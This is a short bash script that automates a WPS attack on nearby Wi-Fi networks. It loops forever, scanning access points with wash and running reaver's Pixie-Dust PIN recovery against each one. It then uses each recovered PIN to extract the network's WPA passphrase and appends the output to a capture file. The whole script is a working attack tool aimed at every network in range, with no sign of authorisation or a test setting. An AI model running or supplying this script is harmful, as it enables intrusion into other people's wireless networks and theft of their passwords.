#!/bin/bash
while true; do
    echo "scanning with wash"
    $(gnu-timeout 16 wash --2ghz -i wlan2mon --ignore-fcs > /tmp/wash-run-output.txt)
    sleep 18s
    echo "done scanning"
    access_points=$(cat /tmp/wash-run-output.txt | tail -n +3 | tr -s ' ' | cut -f1 -d ' ')
    for ap in ${access_points}; do
        echo "found access points"
        temp_line=$(cat /tmp/wash-run-output.txt | grep $ap | tr -s ' ')
        channel=$(echo $temp_line | cut -f2 -d' ')
        mac_address=$(echo $temp_line | cut -f1 -d' ')
        echo "grabbing a pin"
        $(gnu-timeout 22 reaver -S -L -E -w -Z -K -vv -vvv -c $channel -i wlan2mon -b $mac_address > /tmp/reaver-run-output.txt)
        sleep 24s
        echo "done grabbing"
        found_pin=$(cat /tmp/reaver-run-output.txt | grep "WPS pin" | cut -f6 -d ' ')
        echo "found pin /$found_pin/"
        [ -n "$found_pin" ] && [ "$found_pin" -eq "$found_pin" ] 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "the pin /$found_pin/ is not a number"
            sleep 4s
        else
            echo "grabbing acess point WPA PSK"
            $(gnu-timeout 22 reaver -c $channel -i wlan2mon -b $mac_address -p $found_pin >> /sd/LEET/handshakes/RE-AV-ER-TX-T0-00_full.pcap)
            sleep 24s
            echo -e "\n" >> /sd/LEET/handshakes/RE-AV-ER-TX-T0-00_full.pcap
            echo "done grabbing"
            echo "cat /sd/LEET/handshakes/RE-AV-ER-TX-T0-00_full.pcap"
        fi
    done
done
